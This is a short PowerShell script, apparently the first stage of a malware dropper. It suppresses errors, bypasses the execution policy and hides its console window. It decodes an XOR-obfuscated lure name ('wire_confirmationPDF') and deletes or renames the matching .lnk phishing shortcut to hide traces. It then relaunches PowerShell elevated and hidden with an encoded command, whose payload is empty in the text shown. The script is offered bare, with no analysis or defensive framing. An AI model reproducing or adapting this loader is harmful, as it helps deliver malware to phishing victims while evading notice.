$ErrorActionPreference   = "SilentlyContinue"
$WarningPreference       = "SilentlyContinue"
$VerbosePreference       = "SilentlyContinue"
$ProgressPreference      = "SilentlyContinue"

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@

$ConsoleWin = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($ConsoleWin, 0)

$CurrentDir = (Get-Location).Path
$ClientName = $($k9568=60;$b=[byte[]](0x4B,0x55,0x4E,0x59,0x63,0x5F,0x53,0x52,0x5A,0x55,0x4E,0x51,0x5D,0x48,0x55,0x53,0x52,0x6C,0x78,0x7A);-join($b|%{[char]($_ -bxor$k9568)}))

$InkPath = Join-Path $CurrentDir ($ClientName + ".lnk")
if ([System.IO.File]::Exists($InkPath)) {
    try { [System.IO.File]::Delete($InkPath) } catch {
        $dir  = [System.IO.Path]::GetDirectoryName($InkPath)
        $name = [System.IO.Path]::GetFileNameWithoutExtension($InkPath)
        $ext  = [System.IO.Path]::GetExtension($InkPath)
        $c = 1
        do { $np = [System.IO.Path]::Combine($dir, "$name($c)$ext"); $c++ } while ([System.IO.File]::Exists($np))
        try { [System.IO.File]::Move($InkPath, $np) } catch { }
    }
}

Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand '
